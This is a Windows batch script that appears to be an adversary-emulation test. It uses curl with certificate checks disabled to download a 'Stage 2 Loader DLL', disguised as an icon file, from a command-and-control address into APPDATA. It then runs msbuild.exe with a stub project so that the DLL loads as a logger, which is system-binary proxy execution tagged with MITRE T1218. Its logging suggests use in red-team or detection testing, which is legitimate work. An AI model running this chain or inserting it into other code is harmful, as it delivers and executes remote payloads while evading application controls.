@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars)
SET aPxYzB1=%APPDATA%\11592\fe3a72c6
SET cDeFgH2=5a9e7ea5.txt
SET iJkLmN3=https://10.0.0.49/stage/2/icon.png?11592-7
SET oPqRsT4=ITZEL-S2B
SET uVwXyZ5=11592
SET aBcDeF6=7
SET gHiJkL7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: heartbeat_start>> "!gHiJkL7!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!aPxYzB1!\!cDeFgH2!" "!iJkLmN3!"

REM Debug: heartbeat_complete (result 0 = success, 1 = failure)
if exist "!aPxYzB1!\!cDeFgH2!" (
    echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: heartbeat_complete=0>> "!gHiJkL7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: heartbeat_complete=1>> "!gHiJkL7!" 2>nul
)

REM Debug: chdir_start
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: chdir_start>> "!gHiJkL7!" 2>nul

REM Position working directory to output directory
cd /d "!aPxYzB1!" >nul 2>&1

REM Debug: chdir_result (errorlevel)
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: chdir_result=!errorlevel!>> "!gHiJkL7!" 2>nul

REM Create .proj file for msbuild ILogger pattern
echo ^<Project/^> > "!aPxYzB1!\build.proj"

REM Debug: proj_created
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: proj_created>> "!gHiJkL7!" 2>nul

REM Invoke msbuild via /logger: switch — loads Stage 2 DLL as ILogger
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!aPxYzB1!\build.proj" /logger:LoggerEntry,"!aPxYzB1!\!cDeFgH2!";MyParameters,Foo >NUL 2>&1

set msbuild_error=!errorlevel!

REM Debug: msbuild_invoke
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: msbuild_invoke=!msbuild_error!>> "!gHiJkL7!" 2>nul

REM Generate timestamp with millisecond precision for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM TTP log line (T1218^|System Binary Proxy Execution) — conditional on msbuild error
if !msbuild_error! EQU 0 (
    echo [!timestamp!][TTP][!oPqRsT4!][!uVwXyZ5!]: T1218^|System Binary Proxy Execution=OK:>> "!gHiJkL7!" 2>&1
) else (
    echo [!timestamp!][TTP][!oPqRsT4!][!uVwXyZ5!]: T1218^|System Binary Proxy Execution=FAIL:error_code_!msbuild_error!:>> "!gHiJkL7!" 2>&1
)

REM Debug: log_complete
echo [!tsvar!][DEBUG][!oPqRsT4!][!uVwXyZ5!]: log_complete>> "!gHiJkL7!" 2>nul

endlocal